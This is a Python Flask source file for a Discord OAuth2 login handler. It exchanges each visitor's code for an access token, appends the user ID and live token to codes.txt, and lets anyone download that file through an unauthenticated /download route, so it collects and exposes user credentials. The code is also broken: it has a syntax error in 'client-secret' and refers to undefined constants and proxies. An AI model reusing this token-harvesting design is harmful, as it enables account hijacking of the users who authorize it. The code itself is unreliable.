import flask
import requests
import json

with open("config.json", "r") as cfg:
   config = json.load(cfg)

app = flask.Flask(__name__)

client_id = config['client_id']
client-secret = config['client_secret']
redirect_uri = config['redirect_uri']

def userinfo(token):
  headers = {
    "Authorization": "Bearer {}".format(token)
  }
  return requests.get("https://discord.com/api/v8/users/@me",headers=headers).json()

def exchange_code(code):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token' , data=data, headers=headers, proxies=proxies)
  print(r.json())
  return r.json()

@app.route('/', methods=['GET'])
def index():
  return {'message': 'hello, world!'}, 200
  
@app.route('/authenticate', methods=['GET'])
def authenticate():
  try:
    code = flask.request.args['code']
    print(code)
    exchange = exchange_code(code)
    access_token = exchange['access_token']
    with open("codes.txt", 'a') as c:
      c.write(f'{userinfo(access_token)["id"]}:{access_token}\n')
    return "success!"
  except Exception as e:
    print(e)
    return "failed!"
    
@app.route('/download', methods=['GET'])
def download():
    return flask.send_file("codes.txt", as_attachment=True)

if __name__ == "__main__":
   app.run(host="0.0.0.0")
